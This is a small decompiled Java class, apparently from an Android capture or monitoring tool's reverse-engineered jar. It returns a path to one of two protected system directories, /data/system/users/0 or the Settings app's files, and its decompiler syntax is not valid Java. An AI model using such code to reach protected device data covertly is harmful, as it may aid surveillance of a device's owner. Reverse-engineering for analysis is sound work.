package com.vvt.capture.f.a;

import com.vvt.aa.a;
import java.io.File;

public class b
{
  private static final File a;
  private static final File b;
  
  static
  {
    File localFile = new java/io/File;
    localFile.<init>("/data/data/com.android.settings/files");
    a = localFile;
    localFile = new java/io/File;
    localFile.<init>("/data/system/users/0");
    b = localFile;
  }
  
  public static String a()
  {
    boolean bool = a.e();
    if (bool) {}
    for (String str = b.getAbsolutePath();; str = a.getAbsolutePath()) {
      return str;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/f/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */